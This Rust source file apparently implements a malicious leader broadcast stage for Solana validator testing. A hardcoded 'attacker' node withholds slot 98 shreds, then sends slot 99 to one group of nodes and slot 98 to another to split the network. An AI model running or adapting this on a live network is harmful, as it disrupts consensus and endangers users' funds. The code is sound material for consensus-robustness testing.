use {
    super::*,
    crate::cluster_nodes::ClusterNodesCache,
    crossbeam_channel::Sender,
    solana_hash::Hash,
    solana_keypair::Keypair,
    solana_ledger::shred::{ProcessShredsStats, ReedSolomonCache, Shred, Shredder},
    solana_pubkey::Pubkey,
    solana_signer::Signer,
    std::{str::FromStr, sync::OnceLock},
};

#[derive(PartialEq, Eq, Clone, Debug)]
pub enum DualSlotPartition {
    /// Specify both groups by pubkeys explicitly
    GroupPubkeys {
        group_a: Vec<Pubkey>,
        group_b: Vec<Pubkey>,
    },
}

#[derive(Clone, Debug)]
pub struct BroadcastDualSlotConfig {
    /// How to partition nodes into two groups for dual slot broadcasting
    pub partition: DualSlotPartition,
    /// If passed `Some(receiver)`, will signal all the dual slot broadcasts via the given receiver
    pub dual_slot_sender: Option<Sender<(Slot, Slot)>>, // (slot_a, slot_b)
}

/// Global cache structure, caches slot 98 shreds
#[derive(Default, Clone)]
struct GlobalAttackCache {
    cached_slot98_shreds: Option<Vec<Shred>>, // Cached slot 98 shreds
}

/// Global static cache instance
static GLOBAL_ATTACK_CACHE: OnceLock<Arc<Mutex<GlobalAttackCache>>> = OnceLock::new();

/// Get global cache instance
fn get_global_cache() -> Arc<Mutex<GlobalAttackCache>> {
    GLOBAL_ATTACK_CACHE
        .get_or_init(|| Arc::new(Mutex::new(GlobalAttackCache::default())))
        .clone()
}

#[derive(Clone)]
pub(super) struct BroadcastDualSlotRun {
    config: BroadcastDualSlotConfig,
    // Base fields from StandardBroadcastRun
    slot: Slot,
    parent: Slot,
    chained_merkle_root: Hash,
    carryover_entry: Option<WorkingBankEntry>,
    next_shred_index: u32,
    next_code_index: u32,
    completed: bool,
    process_shreds_stats: ProcessShredsStats,
    shred_version: u16,
    cluster_nodes_cache: Arc<ClusterNodesCache<BroadcastStage>>,
    reed_solomon_cache: Arc<ReedSolomonCache>,

    attacker_pubkey: Pubkey, // Attacker public key
}

impl BroadcastDualSlotRun {
    pub(super) fn new(shred_version: u16, config: BroadcastDualSlotConfig) -> Self {
        let cluster_nodes_cache = Arc::new(ClusterNodesCache::<BroadcastStage>::new(
            CLUSTER_NODES_CACHE_NUM_EPOCH_CAP,
            CLUSTER_NODES_CACHE_TTL,
        ));
        Self {
            config,
            slot: Slot::MAX,
            parent: Slot::MAX,
            chained_merkle_root: Hash::default(),
            carryover_entry: None,
            next_shred_index: 0,
            next_code_index: 0,
            completed: true,
            process_shreds_stats: ProcessShredsStats::default(),
            shred_version,
            cluster_nodes_cache,
            reed_solomon_cache: Arc::<ReedSolomonCache>::default(),

            // Initialize dual slot attack fields
            attacker_pubkey: Pubkey::from_str("AqEWUK8pdsfY2CTrBQLGS8w8ndMeuFcDpCkFwWaicaLL")
                .unwrap(),
        }
    }

    /// Check if slots 98 and 99 should be intercepted
    fn should_intercept_slot(&mut self, slot: Slot, keypair: &Keypair) -> (bool, bool) {
        // Only attacker node performs interception
        if keypair.pubkey() != self.attacker_pubkey {
            return (false, false);
        }

        // Hardcoded: only process slots 98 and 99
        if slot == 98 {
            info!("🎯 Intercepting slot 98 (fixed dual slot attack target)");
            return (true, false); // (intercept, is_slot_99)
        } else if slot == 99 {
            info!("🎯 Intercepting slot 99 (fixed dual slot attack target)");
            return (true, true); // (intercept, is_slot_99)
        }

        (false, false)
    }
}

impl BroadcastRun for BroadcastDualSlotRun {
    fn run(
        &mut self,
        keypair: &Keypair,
        blockstore: &Blockstore,
        receiver: &Receiver<WorkingBankEntry>,
        socket_sender: &Sender<(Arc<Vec<Shred>>, Option<BroadcastShredBatchInfo>)>,
        blockstore_sender: &Sender<(Arc<Vec<Shred>>, Option<BroadcastShredBatchInfo>)>,
    ) -> Result<()> {
        // 1) Receive slot data
        let receive_results = broadcast_utils::recv_slot_entries(
            receiver,
            &mut self.carryover_entry,
            &mut self.process_shreds_stats,
        )?;
        let bank = receive_results.bank.clone();
        let last_tick_height = receive_results.last_tick_height;

        // 2) Check if this is a new slot
        if bank.slot() != self.slot {
            self.slot = bank.slot();
            self.parent = bank.parent().unwrap().slot();
            self.chained_merkle_root = broadcast_utils::get_chained_merkle_root_from_parent(
                bank.slot(),
                bank.parent_slot(),
                blockstore,
            )
            .unwrap();
            self.next_shred_index = 0;
            self.next_code_index = 0;
            self.completed = false;

            info!("🆕 New slot {} starting processing", bank.slot());
        }

        if receive_results.entries.is_empty() {
            return Ok(());
        }

        // 3) Create shreds
        let shredder = Shredder::new(
            bank.slot(),
            bank.parent().unwrap().slot(),
            (bank.tick_height() % bank.ticks_per_slot()) as u8,
            self.shred_version,
        )
        .expect("Expected to create a new shredder");

        let (data_shreds, coding_shreds) = shredder.entries_to_shreds(
            keypair,
            &receive_results.entries,
            last_tick_height == bank.max_tick_height(),
            Some(self.chained_merkle_root),
            self.next_shred_index,
            self.next_code_index,
            true, // merkle_variant
            &self.reed_solomon_cache,
            &mut self.process_shreds_stats,
        );

        // Update state
        if let Some(shred) = data_shreds.iter().max_by_key(|shred| shred.index()) {
            self.chained_merkle_root = shred.merkle_root().unwrap();
        }
        self.next_shred_index += data_shreds.len() as u32;
        if let Some(index) = coding_shreds.iter().map(Shred::index).max() {
            self.next_code_index = index + 1;
        }

        // 5) Send normally to blockstore and socket (transmit will handle interception)
        let data_shreds = Arc::new(data_shreds);
        blockstore_sender.send((data_shreds.clone(), None))?;
        socket_sender.send((data_shreds, None))?;

        Ok(())
    }

    fn transmit(
        &mut self,
        receiver: &TransmitReceiver,
        cluster_info: &ClusterInfo,
        sock: &UdpSocket,
        bank_forks: &RwLock<BankForks>,
        _quic_endpoint_sender: &AsyncSender<(SocketAddr, Bytes)>,
    ) -> Result<()> {
        let (shreds, _) = receiver.recv()?;
        if shreds.is_empty() {
            return Ok(());
        }

        let slot = shreds.first().unwrap().slot();

        // 🎯 Core logic: check if this slot's shreds should be intercepted
        let (should_intercept, is_fourth_slot) =
            self.should_intercept_slot(slot, &cluster_info.keypair());

        if should_intercept {
            let cache = get_global_cache();
            let mut global_cache = cache.lock().unwrap();

            if !is_fourth_slot {
                // Slot 98: cache shreds, wait for slot 99
                info!("🎯 Slot 98 cached, waiting for slot 99");
                global_cache.cached_slot98_shreds = Some(shreds.to_vec());
                return Ok(()); // Don't send, wait for slot 99
            } else {
                // Slot 99: trigger dual slot attack
                info!("🎯 Slot 99 arrived, triggering dual slot attack");
                // Continue send flow, grouping logic will handle slot 99 and cached slot 98
            }
        }

        // 📡 Send to network
        info!(
            "📡 Sending slot {} to network ({} shreds total)",
            slot,
            shreds.len()
        );

        let (root_bank, working_bank) = {
            let bank_forks = bank_forks.read().unwrap();
            (bank_forks.root_bank(), bank_forks.working_bank())
        };

        // Create node grouping
        let (group_a, group_b): (HashSet<Pubkey>, HashSet<Pubkey>) = {
            let DualSlotPartition::GroupPubkeys { group_a, group_b } = &self.config.partition;
            (
                group_a.iter().cloned().collect(),
                group_b.iter().cloned().collect(),
            )
        };

        // Get cluster node information
        let cluster_nodes =
            self.cluster_nodes_cache
                .get(slot, &root_bank, &working_bank, cluster_info);
        let socket_addr_space = cluster_info.socket_addr_space();

        // Collect all shreds to send (including cached slot 98)
        let mut all_shreds = shreds.to_vec();

        // If slot 99, include cached slot 98
        if slot == 99 {
            let cache = get_global_cache();
            let global_cache = cache.lock().unwrap();
            if let Some(cached_slot98) = &global_cache.cached_slot98_shreds {
                info!(
                    "📤 Slot 99 also sending cached slot 98 ({} shreds)",
                    cached_slot98.len()
                );
                all_shreds.extend(cached_slot98.clone());
            }
        }

        let mut packets = Vec::new();

        // Process shreds from different slots separately
        for shred in all_shreds.iter() {
            if shred.slot() == 99 {
                let root_node = cluster_nodes.get_broadcast_peer(&shred.id()).unwrap();

                debug!(
                    "🎯 Slot 99: shred_id: {:?}, root_node: {:?}",
                    shred.id(),
                    root_node.pubkey()
                );

                for pubkey in group_a.iter() {
                    let children_count = cluster_nodes
                        .get_children_count(&pubkey, &cluster_info.id(), &shred.id(), 2)
                        .unwrap();
                    debug!(
                        "🎯 Slot 99: pubkey: {:?}, children_count: {:?}",
                        pubkey, children_count
                    );
                }

                for pubkey in group_b.iter() {
                    let children_count = cluster_nodes
                        .get_children_count(&pubkey, &cluster_info.id(), &shred.id(), 2)
                        .unwrap();
                    debug!(
                        "🎯 Slot 99: pubkey: {:?}, children_count: {:?}",
                        pubkey, children_count
                    );
                }

                // Slot 99: send directly to all Group A nodes
                for pubkey in group_a.iter() {
                    let children_count = cluster_nodes
                        .get_children_count(&pubkey, &cluster_info.id(), &shred.id(), 2)
                        .unwrap();
                    if children_count != 0 {
                        debug!(
                            "🎯 Slot 99: pubkey: {:?}, children_count: {:?} skip",
                            pubkey, children_count
                        );
                        continue;
                    }

                    if let Some(node) = cluster_nodes.get_broadcast_peer_pubkey(pubkey) {
                        if let Some(tvu_addr) = node.tvu(Protocol::UDP) {
                            if socket_addr_space.check(&tvu_addr) {
                                debug!(
                                    "🎯 {} sending slot 99 to Group A node {}",
                                    shred.slot(),
                                    pubkey
                                );
                                packets.push((shred.payload(), tvu_addr));
                            }
                        }
                    }
                }
            } else if shred.slot() == 98 {
                let root_node = cluster_nodes.get_broadcast_peer(&shred.id()).unwrap();
                debug!(
                    "🎯 Slot 98: shred_id: {:?}, root_node: {:?}",
                    shred.id(),
                    root_node.pubkey()
                );

                // Slot 98: send directly to all Group B nodes
                for pubkey in group_b.iter() {
                    let children_count = cluster_nodes
                        .get_children_count(&pubkey, &cluster_info.id(), &shred.id(), 2)
                        .unwrap();
                    if children_count != 0 {
                        debug!(
                            "🎯 Slot 98: pubkey: {:?}, children_count: {:?} skip",
                            pubkey, children_count
                        );
                        continue;
                    }

                    if let Some(node) = cluster_nodes.get_broadcast_peer_pubkey(pubkey) {
                        if let Some(tvu_addr) = node.tvu(Protocol::UDP) {
                            if socket_addr_space.check(&tvu_addr) {
                                debug!(
                                    "🎯 {} sending slot 98 to Group B node {}",
                                    shred.slot(),
                                    pubkey
                                );
                                packets.push((shred.payload(), tvu_addr));
                            }
                        }
                    }
                }
            } else {
                // Other slots: send normally to all nodes
                if let Some(node) = cluster_nodes.get_broadcast_peer(&shred.id()) {
                    if let Some(tvu_addr) = node.tvu(Protocol::UDP) {
                        if socket_addr_space.check(&tvu_addr) {
                            debug!(
                                "🎯 {} sending normal shred to all nodes {}",
                                shred.slot(),
                                node.pubkey()
                            );
                            packets.push((shred.payload(), tvu_addr));
                        }
                    }
                }
            }
        }

        let result =
            batch_send(sock, packets).map_err(|SendPktsError::IoError(err, _)| Error::Io(err));

        result
    }

    fn record(&mut self, receiver: &RecordReceiver, blockstore: &Blockstore) -> Result<()> {
        let (all_shreds, _) = receiver.recv()?;
        blockstore
            .insert_shreds(all_shreds.to_vec(), None, true)
            .expect("Failed to insert shreds in blockstore");
        Ok(())
    }
}
